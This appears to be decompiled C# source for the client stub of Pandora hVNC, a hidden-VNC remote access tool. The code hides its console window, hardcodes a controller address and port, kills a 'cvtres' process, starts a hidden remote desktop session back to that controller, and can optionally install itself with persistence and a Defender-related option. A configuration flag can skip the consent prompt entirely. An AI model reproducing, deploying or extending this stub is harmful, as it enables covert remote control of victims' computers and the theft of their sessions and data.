using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Stub
{
	// Token: 0x02000014 RID: 20
	internal class Program
	{
		// Token: 0x06000045 RID: 69
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetConsoleWindow();

		// Token: 0x06000046 RID: 70
		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x06000047 RID: 71 RVA: 0x00003718 File Offset: 0x00001918
		public static void Main(string[] args)
		{
			Program.ShowWindow(Program.GetConsoleWindow(), 0);
			string str = "192.168.85.189";
			string str2 = "1338";
			string identifier = "2B8OC9";
			string mutex = "FSF448";
			string a = "False";
			string path = "-1";
			string folder = "9UKR0H";
			string filename = "P2FH5N.exe";
			string wdex = "False";
			string a2 = "False";
			if (a2 == "False")
			{
				DialogResult dialogResult = MessageBox.Show("Do You Want To Install Pandora hVNC?", "Pandora hVNC", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
				if (dialogResult == DialogResult.Yes)
				{
					if (Process.GetProcessesByName("cvtres").Length == 0)
					{
						HVNC.StartHVNC(str + " " + str2, identifier, mutex);
						if (a == "True")
						{
							Installer.Run(path, folder, filename, wdex);
							return;
						}
					}
					else
					{
						foreach (Process process in Process.GetProcesses())
						{
							if (process.ProcessName == "cvtres")
							{
								process.Kill();
								break;
							}
						}
						HVNC.StartHVNC(str + " " + str2, identifier, mutex);
						if (a == "True")
						{
							Installer.Run(path, folder, filename, wdex);
							return;
						}
					}
				}
				else if (dialogResult == DialogResult.No)
				{
					MessageBox.Show("Pandora WILL NOT be installed to your system", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					Environment.Exit(0);
					return;
				}
			}
			else if (a2 == "True")
			{
				if (Process.GetProcessesByName("cvtres").Length == 0)
				{
					HVNC.StartHVNC(str + " " + str2, identifier, mutex);
					if (a == "True")
					{
						Installer.Run(path, folder, filename, wdex);
						return;
					}
				}
				else
				{
					foreach (Process process2 in Process.GetProcesses())
					{
						if (process2.ProcessName == "cvtres")
						{
							process2.Kill();
							break;
						}
					}
					HVNC.StartHVNC(str + " " + str2, identifier, mutex);
					if (a == "True")
					{
						Installer.Run(path, folder, filename, wdex);
					}
				}
			}
		}

		// Token: 0x04000043 RID: 67
		public const int SW_HIDE = 0;
	}
}
